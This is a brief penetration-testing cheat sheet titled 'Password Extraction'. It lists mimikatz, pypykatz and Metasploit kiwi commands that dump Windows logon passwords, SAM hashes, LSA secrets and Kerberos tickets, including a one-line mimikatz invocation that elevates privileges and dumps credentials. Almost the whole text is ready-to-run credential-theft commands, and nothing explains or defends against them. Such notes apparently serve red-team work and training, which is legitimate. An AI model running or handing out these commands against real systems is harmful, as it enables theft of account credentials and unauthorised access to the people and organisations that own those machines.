# Password Extraction

### mimikatz/pypykatz

Need to match architecture

```bash
privilege::debug
20 ‘OK’

sekurlsa::logonPasswords
lsadump::sam
lsadump::lsa /patch
lsadump::secrets
kerberos::list

mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

pypykatz lsa minidump filename.DMP
```

### Metasploit

```
load kiwi

creds_all
lsa_dump_lsa
lsa_dump_secrets
kerberos_list
```

##
